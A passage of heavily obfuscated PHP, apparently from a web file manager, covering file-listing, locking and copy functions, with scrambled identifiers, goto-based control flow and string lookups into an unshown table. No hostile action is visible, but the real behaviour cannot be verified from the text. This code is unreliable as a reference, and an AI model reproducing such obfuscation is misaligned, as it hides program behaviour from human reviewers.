dò„šĞØÆ; dò„šĞØÆ: $cìàè«¶¿ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (intval($E˜ªšò×çø[$cìàè«¶¿[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($Aá¾¡ÆÚ¹½, $E„²¶ä¸ï¤) && $E˜ªšò×çø[$cìàè«¶¿[369]] != $Aá¾¡ÆÚ¹½) { return; } goto CÄê£Áóõİ; f¾Ç¡ãËÏ¼: $E˜ªšò×çø[$cìàè«¶¿[461]] = $cìàè«¶¿[472] . implode($cìàè«¶¿[47], array_slice($E„²¶ä¸ï¤, 1)) . $cìàè«¶¿[47]; if ($E˜ªšò×çø[$cìàè«¶¿[369]] == $Aá¾¡ÆÚ¹½) { $E˜ªšò×çø[$cìàè«¶¿[461]] = $cìàè«¶¿[472]; $E˜ªšò×çø[$cìàè«¶¿[463]] = $cìàè«¶¿[470]; $E˜ªšò×çø[$cìàè«¶¿[28]] = LNG($cìàè«¶¿[471]); } $E˜ªšò×çø[$cìàè«¶¿[473]] = $cìàè«¶¿[474]; goto BÒ»İ¡³Ğ¡; CÄê£Áóõİ: $c™„Ü«ˆ’ = explode($cìàè«¶¿[8], trim($E˜ªšò×çø[$cìàè«¶¿[468]], $cìàè«¶¿[8])); $eñö°•‡½š = implode($cìàè«¶¿[8], array_slice($c™„Ü«ˆ’, 2)); $E˜ªšò×çø[$cìàè«¶¿[468]] = $cìàè«¶¿[8] . LNG($cìàè«¶¿[471]) . $cìàè«¶¿[8] . ltrim($eñö°•‡½š, $cìàè«¶¿[8]); goto f¾Ç¡ãËÏ¼; BÒ»İ¡³Ğ¡: } protected function _listAppendPathRoot(&$FÆéùãá, $BÓê½¢õ©Ë) { $c§É×î™‹£ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f„Öš¼ãÁŞ = $c§É×î™‹£[33]; if ($FÆéùãá[$c§É×î™‹£[371]] == self::TYPE_USER) { if (defined($c§É×î™‹£[427]) && $FÆéùãá[$c§É×î™‹£[458]] == USER_ID) { $f„Öš¼ãÁŞ = LNG($c§É×î™‹£[475]); if (!$BÓê½¢õ©Ë) { $FÆéùãá[$c§É×î™‹£[28]] = $f„Öš¼ãÁŞ; } } else { $fÉİ®ÇËÅ = Model($c§É×î™‹£[476])->getInfoSimple($FÆéùãá[$c§É×î™‹£[458]]); $f„Öš¼ãÁŞ = LNG($c§É×î™‹£[477]) . $c§É×î™‹£[157] . $fÉİ®ÇËÅ[$c§É×î™‹£[28]] . $c§É×î™‹£[478]; } } else { if ($FÆéùãá[$c§É×î™‹£[371]] == self::TYPE_GROUP) { $fÉİ®ÇËÅ = Model($c§É×î™‹£[460])->getInfoSimple($FÆéùãá[$c§É×î™‹£[458]]); $f„Öš¼ãÁŞ = $fÉİ®ÇËÅ[$c§É×î™‹£[28]]; } else { if ($FÆéùãá[$c§É×î™‹£[371]] == self::TYPE_SYSTEM) { $fÉİ®ÇËÅ = $this->sourceInfo($BÓê½¢õ©Ë[0], !0); $f„Öš¼ãÁŞ = $fÉİ®ÇËÅ[$c§É×î™‹£[28]]; } } } $f„Öš¼ãÁŞ = $f„Öš¼ãÁŞ ? $c§É×î™‹£[8] . $f„Öš¼ãÁŞ . $c§É×î™‹£[8] : $c§É×î™‹£[8]; return $f„Öš¼ãÁŞ; } protected function _listAppendUser(&$fÒÔÄâèŞÈ) { $CÁ¤Ä±„ß• =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Aš×½´Ü†Õ = array_to_keyvalue($fÒÔÄâèŞÈ, $CÁ¤Ä±„ß•[33], $CÁ¤Ä±„ß•[378]); $aÂ²…âÎºÒ = array_to_keyvalue($fÒÔÄâèŞÈ, $CÁ¤Ä±„ß•[33], $CÁ¤Ä±„ß•[379]); $bƒÚ¬›Û‚³ = array_merge($Aš×½´Ü†Õ, $aÂ²…âÎºÒ); $c˜Ö²¬„‡ = Model($CÁ¤Ä±„ß•[479])->userListInfo($bƒÚ¬›Û‚³); foreach ($fÒÔÄâèŞÈ as &$CåÛâ†ã£•) { $AŸÃÌĞ«‘ = $CåÛâ†ã£•[$CÁ¤Ä±„ß•[378]]; $CåÛâ†ã£•[$CÁ¤Ä±„ß•[378]] = $c˜Ö²¬„‡[$AŸÃÌĞ«‘] ? $c˜Ö²¬„‡[$AŸÃÌĞ«‘] : !1; $AŸÃÌĞ«‘ = $CåÛâ†ã£•[$CÁ¤Ä±„ß•[379]]; $CåÛâ†ã£•[$CÁ¤Ä±„ß•[379]] = $c˜Ö²¬„‡[$AŸÃÌĞ«‘] ? $c˜Ö²¬„‡[$AŸÃÌĞ«‘] : !1; if (isset($CåÛâ†ã£•[$CÁ¤Ä±„ß•[417]]) && $CåÛâ†ã£•[$CÁ¤Ä±„ß•[417]][$CÁ¤Ä±„ß•[480]]) { $e½¡Ï¸ôŸ = $GLOBALS[$CÁ¤Ä±„ß•[6]][$CÁ¤Ä±„ß•[84]][$CÁ¤Ä±„ß•[481]]; if ($CåÛâ†ã£•[$CÁ¤Ä±„ß•[417]][$CÁ¤Ä±„ß•[482]] <= time() - $e½¡Ï¸ôŸ) { $this->metaSet($CåÛâ†ã£•[$CÁ¤Ä±„ß•[369]], $CÁ¤Ä±„ß•[480], null); $this->metaSet($CåÛâ†ã£•[$CÁ¤Ä±„ß•[369]], $CÁ¤Ä±„ß•[482], null); unset($CåÛâ†ã£•[$CÁ¤Ä±„ß•[417]][$CÁ¤Ä±„ß•[480]]); continue; } $bÄìùíÏ¬Ô = $CåÛâ†ã£•[$CÁ¤Ä±„ß•[417]][$CÁ¤Ä±„ß•[480]]; $CåÛâ†ã£•[$CÁ¤Ä±„ß•[417]][$CÁ¤Ä±„ß•[483]] = Model($CÁ¤Ä±„ß•[479])->getInfoSimpleOuter($bÄìùíÏ¬Ô); } } } public function parentLevelArray($F®™ÜÊ›Ôá) { $B‘±¶ŠßæÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F®™ÜÊ›Ôá = explode($B‘±¶ŠßæÓ[47], trim($F®™ÜÊ›Ôá, $B‘±¶ŠßæÓ[47])); return array_remove_value($F®™ÜÊ›Ôá, $B‘±¶ŠßæÓ[470]); } public function listAll($AÀ–¥Ÿµšê) { goto e¼ĞµÔõÓ; e¼ĞµÔõÓ: $Fá×ç’« =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C¡ôÎ½…à‡ = $this->sourceInfo($AÀ–¥Ÿµšê); $CĞÇ‘”ß«Õ = array($Fá×ç’«[484] => array($Fá×ç’«[485], $C¡ôÎ½…à‡[$Fá×ç’«[461]] . $AÀ–¥Ÿµšê . $Fá×ç’«[486]), $Fá×ç’«[487] => 0); goto FŒã¾à‡‹‡; dòÔ£ˆ‡: $this->_listAppendAuth($e´ĞŠÊîİÀ); $this->_listAppendUser($e´ĞŠÊîİÀ); $this->_listAppendPath($e´ĞŠÊîİÀ); goto CÖß…„‚âµ; aÁİèÎ¼©’: $fŠÚ¸ŞáÓâ = array(); foreach ($e´ĞŠÊîİÀ as $d‰Ïƒ¡ê„ => $E»×ÆçÁÁ) { goto FÖ¬ÒåÁï; aÁÄĞù´ï: for ($Fº‰™’á = 0; $Fº‰™’á < count($eÄËÕéÖÛÎ); $Fº‰™’á++) { $få¦İ ôØÎ .= $e´ĞŠÊîİÀ[$eÄËÕéÖÛÎ[$Fº‰™’á]][$Fá×ç’«[28]] . $Fá×ç’«[8]; } $få¦İ ôØÎ .= $E»×ÆçÁÁ[$Fá×ç’«[28]]; if ($E»×ÆçÁÁ[$Fá×ç’«[370]]) { $få¦İ ôØÎ .= $Fá×ç’«[8]; } goto Cá›¿Œ–„„; Cá›¿Œ–„„: $få¦İ ôØÎ = str_replace($Fá×ç’«[469], $Fá×ç’«[8], $få¦İ ôØÎ); $få¦İ ôØÎ = str_replace($Fá×ç’«[469], $Fá×ç’«[8], $få¦İ ôØÎ); $aò†¦ÃéµÚ = array($Fá×ç’«[387] => str_replace($Fá×ç’«[469], $Fá×ç’«[8], $få¦İ ôØÎ), $Fá×ç’«[490] => intval($E»×ÆçÁÁ[$Fá×ç’«[370]]), $Fá×ç’«[391] => $this->pathInfoFilter($E»×ÆçÁÁ, !0)); goto FÅôÎã¾Æ; FÖ¬ÒåÁï: $eÄËÕéÖÛÎ = $this->parentLevelArray($E»×ÆçÁÁ[$Fá×ç’«[461]]); array_shift($eÄËÕéÖÛÎ); $få¦İ ôØÎ = $BŠóÒ¢ì‘Í; goto aÁÄĞù´ï; FÅôÎã¾Æ: if (!$E»×ÆçÁÁ[$Fá×ç’«[370]]) { $aò†¦ÃéµÚ[$Fá×ç’«[419]] = $E»×ÆçÁÁ[$Fá×ç’«[419]]; $aò†¦ÃéµÚ[$Fá×ç’«[491]] = $E»×ÆçÁÁ[$Fá×ç’«[75]]; } $fŠÚ¸ŞáÓâ[] = $aò†¦ÃéµÚ; goto ašï¥Äšº; ašï¥Äšº: } return $fŠÚ¸ŞáÓâ; goto BäŞ”Š–¶¨; FŒã¾à‡‹‡: $FªÄŒ±Ò¥ = $Fá×ç’«[488]; $DÃÊÇ¹ÆÈÕ = "\114\105\106\x54\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\x66\x69\x6c\145\40\146\x69\x6c\x65\x20\x6f\156\x20\x73\157\x75\162\143\145\x2e\146\x69\x6c\145\111\104\x20\x3d\x20\146\151\x6c\x65\56\x66\x69\x6c\145\111\104"; $e´ĞŠÊîİÀ = $this->alias($Fá×ç’«[489])->field($FªÄŒ±Ò¥)->where($CĞÇ‘”ß«Õ)->join($DÃÊÇ¹ÆÈÕ)->select(); goto dòÔ£ˆ‡; CÖß…„‚âµ: $e´ĞŠÊîİÀ = array_to_keyvalue($e´ĞŠÊîİÀ, $Fá×ç’«[369]); $BŠóÒ¢ì‘Í = "\x2f{$C¡ôÎ½…à‡[$Fá×ç’«[28]]}\57"; $BŠóÒ¢ì‘Í = $BŠóÒ¢ì‘Í == $Fá×ç’«[469] ? $Fá×ç’«[8] : $BŠóÒ¢ì‘Í; goto aÁİèÎ¼©’; BäŞ”Š–¶¨: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($cÁ‚Š§‘¿) { goto Aé¥ÜØï¢ß; EîÊÊ¦¥‘: $DšÙ¯Ö©íâ = 1; $this->_lockEvent($cÁ‚Š§‘¿, array($DÀ‰™œøœÙ[493], $DÀ‰™œøœÙ[494]), $DšÙ¯Ö©íâ); $this->_lockParent($cÁ‚Š§‘¿, array($DÀ‰™œøœÙ[494]), $DšÙ¯Ö©íâ); goto cŠ³Æˆ—¹±; cŠ³Æˆ—¹±: $this->_lockEvent($cÁ‚Š§‘¿, array($DÀ‰™œøœÙ[495], $DÀ‰™œøœÙ[496]), $DšÙ¯Ö©íâ); $this->_lockCheckEnd($DÀ‰™œøœÙ[492], $cÁ‚Š§‘¿); goto cµÖù ¯‰¨; Aé¥ÜØï¢ß: $DÀ‰™œøœÙ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->allowLock()) { return; } $this->_lockCheck($DÀ‰™œøœÙ[492], $cÁ‚Š§‘¿); goto EîÊÊ¦¥‘; cµÖù ¯‰¨: } public function lockCopyEnd($a÷…¯ÉØÀã) { $D‚ïçãÀ—ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->allowLock()) { return; } $AÀµ®¹ = 0; $this->_lockEvent($a÷…¯ÉØÀã, array($D‚ïçãÀ—ä[493], $D‚ïçãÀ—ä[494]), $AÀµ®¹); $this->_lockParent($a÷…¯ÉØÀã, array($D‚ïçãÀ—ä[494]), $AÀµ®¹); $this->_lockEvent($a÷…¯ÉØÀã, array($D‚ïçãÀ—ä[495], $D‚ïçãÀ—ä[496]), $AÀµ®¹); } public function lockWriteStart($BÍš¾Ó“æÌ, $eğ£áõÊ©¬ = '') { goto dÛéåéÆÙï; Cå–Ğãğ„“: $this->_lockParent($BÍš¾Ó“æÌ, array($bãº¿Ğñ[492], $bãº¿Ğñ[494]), $DŞ…Î¾—¬È); $this->_lockCheckEnd($bãº¿Ğñ[493], $BÍš¾Ó“æÌ); goto DéÓÍìâÜ×; B—Îâ‘Æ«ó: $DŞ…Î¾—¬È = 1; $this->_lockKey($bãº¿Ğñ[497] . $BÍš¾Ó“æÌ . $bãº¿Ğñ[91] . $eğ£áõÊ©¬, $DŞ…Î¾—¬È); $this->_lockEvent($BÍš¾Ó“æÌ, array($bãº¿Ğñ[492], $bãº¿Ğñ[494]), $DŞ…Î¾—¬È); goto Cå–Ğãğ„“; dÛéåéÆÙï: $bãº¿Ğñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->allowLock()) { return; } $this->_lockCheck($bãº¿Ğñ[493], $BÍš¾Ó“æÌ); goto B—Îâ‘Æ«ó; DéÓÍìâÜ×: } public function lockWriteEnd($FßÚÏåÙ±ò, $F»µ”ÇË³ = '') { $C‡“ŒÕ ££ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->allowLock()) { return; } $e‹ÓÕ¼Í›¾ = 0; $this->_lockKey($C‡“ŒÕ ££[497] . $FßÚÏåÙ±ò . $C‡“ŒÕ ££[91] . $F»µ”ÇË³, $e‹ÓÕ¼Í›¾); $this->_lockEvent($FßÚÏåÙ±ò, array($C‡“ŒÕ ££[492], $C‡“ŒÕ ££[494]), $e‹ÓÕ¼Í›¾); $this->_lockParent($FßÚÏåÙ±ò, array($C‡“ŒÕ ££[492], $C‡“ŒÕ ££[494]), $e‹ÓÕ¼Í›¾); } public function lockMoveStart($fé‹íÇø‹š) { goto BÉÜ­ÜÁÛø; BÉÜ­ÜÁÛø: $b‹´ŠšëŠ… =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->allowLock()) { return; } $this->_lockCheck($b‹´ŠšëŠ…[494], $fé‹íÇø‹š); goto c³‚Ò¤ÛÛ¼; c³‚Ò¤ÛÛ¼: $E¯ôÕÃº = 1; $this->_lockKey($b‹´ŠšëŠ…[498] . $fé‹íÇø‹š, $E¯ôÕÃº); $this->_lockEvent($fé‹íÇø‹š, array($b‹´ŠšëŠ…[492], $b‹´ŠšëŠ…[493]), $E¯ôÕÃº); goto bî°ˆê¢÷×; bî°ˆê¢÷×: $this->_lockParent($fé‹íÇø‹š, array($b‹´ŠšëŠ…[492], $b‹´ŠšëŠ…[494]), $E¯ôÕÃº); $this->_lockEvent($fé‹íÇø‹š, array($b‹´ŠšëŠ…[499], $b‹´ŠšëŠ…[495], $b‹´ŠšëŠ…[496]), $E¯ôÕÃº); $this->_lockCheckEnd($b‹´ŠšëŠ…[494], $fé‹íÇø‹š); goto fî¶½; fî¶½: } public function lockMoveEnd($bˆŸŞœêÁº) { goto b©ÉšÉ·; aºªâ¨¯²‡: $this->_lockKey($f‡•ÊÌèÚ[498] . $bˆŸŞœêÁº, $CÑ©‡›åÚ); $this->_lockEvent($bˆŸŞœêÁº, array($f‡•ÊÌèÚ[492], $f‡•ÊÌèÚ[493]), $CÑ©‡›åÚ); $this->_lockParent($bˆŸŞœêÁº, array($f‡•ÊÌèÚ[492], $f‡•ÊÌèÚ[494]), $CÑ©‡›åÚ); goto bÙ¸Ì ™Àœ; b©ÉšÉ·: $f‡•ÊÌèÚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->allowLock()) { return; } $CÑ©‡›åÚ = 0; goto aºªâ¨¯²‡; bÙ¸Ì ™Àœ: $this->_lockEvent($bˆŸŞœêÁº, array($f‡•ÊÌèÚ[499], $f‡•ÊÌèÚ[495], $f‡•ÊÌèÚ[496]), $CÑ©‡›åÚ); goto eÁ´ÓÕ›¥×; eÁ´ÓÕ›¥×: } private function _lockCheck($c›¤¡Ÿª, $E—Ëˆ±æÛÃ) { goto e†”·Œƒó¶; e†”·Œƒó¶: $Cæ”µ¥¡¸ƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C‡½ÌÙƒŠ® = $this->sourceInfo($E—Ëˆ±æÛÃ); $Cˆ¯›¦Ÿ’Â = $c›¤¡Ÿª . $Cæ”µ¥¡¸ƒ[91] . $E—Ëˆ±æÛÃ; goto e™–—£Âô‡; e™–—£Âô‡: $this->_lockTimeStart[$Cˆ¯›¦Ÿ’Â] = timeFloat(); if (!is_array($C‡½ÌÙƒŠ®)) { return; } $f†µ­×Ïë = LNG($Cæ”µ¥¡¸ƒ[500]); goto D¹æº¼Û£˜; C˜¸Ò¡Åîˆ: $aÌÚí»Ñë = array_reverse($this->parentLevelArray($C‡½ÌÙƒŠ®[$Cæ”µ¥¡¸ƒ[461]])); foreach ($aÌÚí»Ñë as $Dâä×¦‰œ) { $Cˆ¯›¦Ÿ’Â = $c›¤¡Ÿª . $Cæ”µ¥¡¸ƒ[501] . $Dâä×¦‰œ; if (CacheLock::lockGet($Cæ”µ¥¡¸ƒ[502] . $Cˆ¯›¦Ÿ’Â)) { $C‡½ÌÙƒŠ® = $this->sourceInfo($Dâä×¦‰œ); CacheLock::setErrorMsg($Cæ”µ¥¡¸ƒ[157] . htmlspecialchars($C‡½ÌÙƒŠ®[$Cæ”µ¥¡¸ƒ[28]]) . $Cæ”µ¥¡¸ƒ[478] . $f†µ­×Ïë); $this->_lockKey($Cˆ¯›¦Ÿ’Â, 1); $this->_lockKey($Cˆ¯›¦Ÿ’Â, 0); } } goto C“›Ÿ„ÎÎ¸; D¹æº¼Û£˜: CacheLock::setErrorMsg($Cæ”µ¥¡¸ƒ[157] . htmlspecialchars($C‡½ÌÙƒŠ®[$Cæ”µ¥¡¸ƒ[28]]) . $Cæ”µ¥¡¸ƒ[478] . $f†µ­×Ïë); $this->_lockKey($Cˆ¯›¦Ÿ’Â, 1); $this->_lockKey($Cˆ¯›¦Ÿ’Â, 0); goto C˜¸Ò¡Åîˆ; C“›Ÿ„ÎÎ¸: } private function _lockCheckEnd($añÍ“¼Õİô, $B¢™÷‡½ÁÒ) { goto Bº“çìì§í; a‡‡äÏ½Ö: if (!isset($this->_lockTimeStart[$CÌ˜¨–¼·˜])) { return; } $E—•“ßæË” = timeFloat() - $this->_lockTimeStart[$CÌ˜¨–¼·˜]; unset($this->_lockTimeStart[$CÌ˜¨–¼·˜]); goto BàÂ´‚£¦º; BàÂ´‚£¦º: if ($E—•“ßæË” > 0.5) { unset(self::$cacheSourceInfo[$cƒ¯Œ™´»Œ[410] . $B¢™÷‡½ÁÒ]); } $a¥»²áÖ¿Ì = $this->sourceInfo($B¢™÷‡½ÁÒ); if (!$a¥»²áÖ¿Ì) { show_json(LNG($cƒ¯Œ™´»Œ[101]), !1); } goto bìŒµñÒÒ¬; Bº“çìì§í: $cƒ¯Œ™´»Œ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÌ˜¨–¼·˜ = $añÍ“¼Õİô . $cƒ¯Œ™´»Œ[91] . $B¢™÷‡½ÁÒ; CacheLock::setErrorMsg($cƒ¯Œ™´»Œ[361]); goto a‡‡äÏ½Ö; bìŒµñÒÒ¬: } private function _lockParent($BØ‡™šù», $f©îëğÎ—, $e¡ãà¦‹¬Ë) { if (!$this->autoLockSet) { return; } $E¯Ç®²¢ìÖ = $this->sourceInfo($BØ‡™šù»); if (!is_array($E¯Ç®²¢ìÖ)) { return; } $b¹±‹Š¹ = array_reverse($this->parentLevelArray($E¯Ç®²¢ìÖ[$_SERVER[´Ù×Íå‘ÄõÛ][461]])); foreach ($b¹±‹Š¹ as $EñÁàŸíˆÖ) { $this->_lockEvent($EñÁàŸíˆÖ, $f©îëğÎ—, $e¡ãà¦‹¬Ë); } } private function _lockEvent($b©³ø¾„, $E¼­­Úâœ, $aù‘ŸÍ³Şñ) { $B«Šòµ¬â¢ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->autoLockSet) { return; } foreach ($E¼­­Úâœ as $BŒµˆ±¨ò) { $fÄ±âãö‘ğ = $BŒµˆ±¨ò . $B«Šòµ¬â¢[91] . $b©³ø¾„; if ($aù‘ŸÍ³Şñ && CacheLock::lockGet($B«Šòµ¬â¢[502] . $fÄ±âãö‘ğ)) { continue; } $this->_lockKey($fÄ±âãö‘ğ, $aù‘ŸÍ³Şñ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Cğ×¿æÛŞ›, $a‡ŒÒæÍ‚´ = 1) { $c¤ª§åßÁ = $_SERVER[´Ù×Íå‘ÄõÛ][502] . md5($Cğ×¿æÛŞ›); if ($a‡ŒÒæÍ‚´) { if (isset(self::$_lockItemArr[$c¤ª§åßÁ])) { return; } self::$_lockItemArr[$c¤ª§åßÁ] = 1; CacheLock::lock($c¤ª§åßÁ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$c¤ª§åßÁ])) { return; } unset(self::$_lockItemArr[$c¤ª§åßÁ]); CacheLock::unlock($c¤ª§åßÁ); } } public function isParentOf($b‹§ˆŸ—ß, $cëŒ×¶ğš«) { goto aóÀ†˜Ê½; C…ÆºË†Ûá: return $cŠáßñ¿åÓ; goto CĞéÎã“—¥; aóÀ†˜Ê½: $AïÕäî¶Ú =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fù®‘¶“¡í = $this->sourceInfo($b‹§ˆŸ—ß); $fÜ‡ÉÇéĞŠ = $this->sourceInfo($cëŒ×¶ğš«); goto B”Ã†åøñ; B”Ã†åøñ: $eôèé¿‰é = $Fù®‘¶“¡í[$AïÕäî¶Ú[461]] . $Fù®‘¶“¡í[$AïÕäî¶Ú[369]] . $AïÕäî¶Ú[47]; $E„¯«»ÂÆ° = $fÜ‡ÉÇéĞŠ[$AïÕäî¶Ú[461]] . $fÜ‡ÉÇéĞŠ[$AïÕäî¶Ú[369]] . $AïÕäî¶Ú[47]; $cŠáßñ¿åÓ = strpos($E„¯«»ÂÆ°, $eôèé¿‰é) === 0; goto C…ÆºË†Ûá; CĞéÎã“—¥: } private $targetIsDelete = 0; public function copy($F†‡ˆªáÂí, $dµÎ¬ªˆöĞ, $B‰ÎÑÈ­«ö = REPEAT_REPLACE, $cª•„¥ = '') { goto Fóæ†¿ç; bØ›Öğ»Ï: $this->saveAll($fÒÑŒŒÃ–[$Bó½Ã®ùâ[505]]); Model($Bó½Ã®ùâ[167])->linkAdd($fÒÑŒŒÃ–[$Bó½Ã®ùâ[503]]); $this->folderSizeReset($dµÎ¬ªˆöĞ); goto a¤ ÆÂÑ½; Fóæ†¿ç: $Bó½Ã®ùâ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÇğœ‰”“ = $this->sourceInfo($F†‡ˆªáÂí); $FÁ´­Ê­˜— = $this->sourceInfo($dµÎ¬ªˆöĞ); goto B†Ú¤˜ôó; Aˆ°Û†ëİÎ: if ($CÇğœ‰”“[$Bó½Ã®ùâ[370]] == $Bó½Ã®ùâ[83] && $dô‡òæ˜ˆ‡ == $f‘©ö‚Ì³) { $this->folderSizeResetChildren($dô‡òæ˜ˆ‡); } Model($Bó½Ã®ùâ[506])->addAll($fÒÑŒŒÃ–[$Bó½Ã®ùâ[504]], array(), !0); if ($dô‡òæ˜ˆ‡ != $f‘©ö‚Ì³ || $CÇğœ‰”“[$Bó½Ã®ùâ[370]] == $Bó½Ã®ùâ[83]) { Model($Bó½Ã®ùâ[507])->eventCopy($f‘©ö‚Ì³); } goto bØ›Öğ»Ï; eìöÔÓÒÆ¸: $this->_childrenListClear(); $this->lockCopyEnd($F†‡ˆªáÂí); $this->lockWriteEnd($dµÎ¬ªˆöĞ, $e—çš¤é¢ˆ); goto Aˆ°Û†ëİÎ; a¤ ÆÂÑ½: $this->updateModifyTime($dµÎ¬ªˆöĞ); return $f‘©ö‚Ì³; goto AÛ¯Ó¨¥Ë´; B†Ú¤˜ôó: if (!$CÇğœ‰”“ || !$FÁ´­Ê­˜— || $FÁ´­Ê­˜—[$Bó½Ã®ùâ[370]] != $Bó½Ã®ùâ[83]) { return !1; } if ($this->isParentOf($F†‡ˆªáÂí, $dµÎ¬ªˆöĞ)) { return !1; } $e—çš¤é¢ˆ = $cª•„¥ ? $cª•„¥ : $CÇğœ‰”“[$Bó½Ã®ùâ[28]]; goto E»×Ô¦–à; eÑÃ¤ñô: $this->targetIsDelete = intval($CÇğœ‰”“[$Bó½Ã®ùâ[397]]); $dô‡òæ˜ˆ‡ = $this->fileNameExistCache($dµÎ¬ªˆöĞ, $CÇğœ‰”“[$Bó½Ã®ùâ[28]]); $f‘©ö‚Ì³ = $this->_copy($F†‡ˆªáÂí, $dµÎ¬ªˆöĞ, $B‰ÎÑÈ­«ö, $fÒÑŒŒÃ–, !0, $cª•„¥); goto eìöÔÓÒÆ¸; E»×Ô¦–à: $this->lockCopyStart($F†‡ˆªáÂí); $this->lockWriteStart($dµÎ¬ªˆöĞ, $e—çš¤é¢ˆ); $fÒÑŒŒÃ– = array($Bó½Ã®ùâ[503] => array(), $Bó½Ã®ùâ[504] => array(), $Bó½Ã®ùâ[505] => array()); goto eÑÃ¤ñô; AÛ¯Ó¨¥Ë´: } private function _copy($cÀÌŠŠ§¼, $AÕëÆÔ…ê‡, $bÈ¶¯šè°ƒ, &$EÑ°¹çˆÔ, $e‰·§÷ŸóÜ, $E­¼…„¾ˆˆ = '') { goto E¡ƒí†´ÜÔ; B§±³«ò›Á: if (!$a©¼‘„–ß¶) { return $this->_copyCreate($cÀÌŠŠ§¼, $AÕëÆÔ…ê‡, $A¸‰¼ ‘˜ˆ, $EÑ°¹çˆÔ); } $aÏŠƒØêøƒ = $a©¼‘„–ß¶; if ($dŒ×§ùê…) { if ($bÈ¶¯šè°ƒ == REPEAT_RENAME_FOLDER) { $A¸‰¼ ‘˜ˆ = $this->fileNameAutoCache($AÕëÆÔ…ê‡, $A¸‰¼ ‘˜ˆ, $bÈ¶¯šè°ƒ, $dŒ×§ùê…); $aÏŠƒØêøƒ = $this->_copyCreate($cÀÌŠŠ§¼, $AÕëÆÔ…ê‡, $A¸‰¼ ‘˜ˆ, $EÑ°¹çˆÔ); } else { $cÌ££§äÈ¥ = $this->_childrenList($cÀÌŠŠ§¼); foreach ($cÌ££§äÈ¥ as $c¯¸Õ”¬Í ) { $this->_copy($c¯¸Õ”¬Í [$Aæ•’¸§Û‹[369]], $a©¼‘„–ß¶, $bÈ¶¯šè°ƒ, $EÑ°¹çˆÔ, !1); } } } else { if ($bÈ¶¯šè°ƒ == REPEAT_RENAME || $bÈ¶¯šè°ƒ == REPEAT_RENAME_FOLDER) { $A¸‰¼ ‘˜ˆ = $this->fileNameAutoCache($AÕëÆÔ…ê‡, $A¸‰¼ ‘˜ˆ, $bÈ¶¯šè°ƒ, $dŒ×§ùê…); $aÏŠƒØêøƒ = $this->_copyCreate($cÀÌŠŠ§¼, $AÕëÆÔ…ê‡, $A¸‰¼ ‘˜ˆ, $EÑ°¹çˆÔ); } else { if ($bÈ¶¯šè°ƒ == REPEAT_REPLACE) { $e¬šÊ°Ÿî¥ = $this->sourceInfoCache($a©¼‘„–ß¶); $Ağ¿Á¼ëáˆ = $this->fileHistory($e¬šÊ°Ÿî¥, $EºÎƒÒÃğ°[$Aæ•’¸§Û‹[419]], $EºÎƒÒÃğ°[$Aæ•’¸§Û‹[77]]); if ($Ağ¿Á¼ëáˆ) { $EÑ°¹çˆÔ[$Aæ•’¸§Û‹[503]][] = $EºÎƒÒÃğ°[$Aæ•’¸§Û‹[419]]; } } else { if ($bÈ¶¯šè°ƒ == REPEAT_SKIP) { } } } Hook::trigger($Aæ•’¸§Û‹[508], array($Aæ•’¸§Û‹[509], $EºÎƒÒÃğ°, 0)); } goto dé·ÉğÓÙ…; B¯›åêÙ‰ö: $A¸‰¼ ‘˜ˆ = $E­¼…„¾ˆˆ ? $E­¼…„¾ˆˆ : $EºÎƒÒÃğ°[$Aæ•’¸§Û‹[28]]; $a©¼‘„–ß¶ = $this->fileNameExistCache($AÕëÆÔ…ê‡, $A¸‰¼ ‘˜ˆ); if ($e‰·§÷ŸóÜ) { $this->_childrenAllMake($cÀÌŠŠ§¼); if ($dŒ×§ùê… && $a©¼‘„–ß¶) { $this->_childrenAllMake($a©¼‘„–ß¶); } } goto B§±³«ò›Á; dé·ÉğÓÙ…: return $aÏŠƒØêøƒ; goto Bˆ’ù‘«„Õ; E¡ƒí†´ÜÔ: $Aæ•’¸§Û‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EºÎƒÒÃğ° = $this->sourceInfoCache($cÀÌŠŠ§¼); $dŒ×§ùê… = $EºÎƒÒÃğ°[$Aæ•’¸§Û‹[370]] == $Aæ•’¸§Û‹[83]; goto B¯›åêÙ‰ö; Bˆ’ù‘«„Õ: } private function _copyCreate($câ©ªÉÕ‘®, $B¦‚Ú„¶Ñ–, $bÙ¸Ï™ˆ, &$F­»åµ§Û«) { goto fÅÄ¤äá–; aâ”Àì“: $fÎ¤–ÔÀ = $this->_makeItemData($b·™¿‡òÙÄ, $CÃæİš¢Âò, $bÙ¸Ï™ˆ); Hook::trigger($aÖÜŒŠÍÉ[510], $fÎ¤–ÔÀ); Hook::trigger($aÖÜŒŠÍÉ[511], array($aÖÜŒŠÍÉ[512], $fÎ¤–ÔÀ, 0)); goto Bã×”Ÿáºê; cßÍì¶‰¡: $c‚¡½©Ë„[$câ©ªÉÕ‘®] = $a‰Â‚çÌõ‰; $b¤æÑ—å– = array(); $Aƒƒ£õö÷÷ = array(); goto aŞØÖë½É“; fÊ‹åÖ¼Óå: $this->chunkEventSet($aÖÜŒŠÍÉ[517], array($aÖÜŒŠÍÉ[518], $fÎ¤–ÔÀ, $D©›¹ºÙˆ)); $this->saveAll($Aƒƒ£õö÷÷); return $a‰Â‚çÌõ‰; goto dğë£ÓóáÌ; fÅÄ¤äá–: 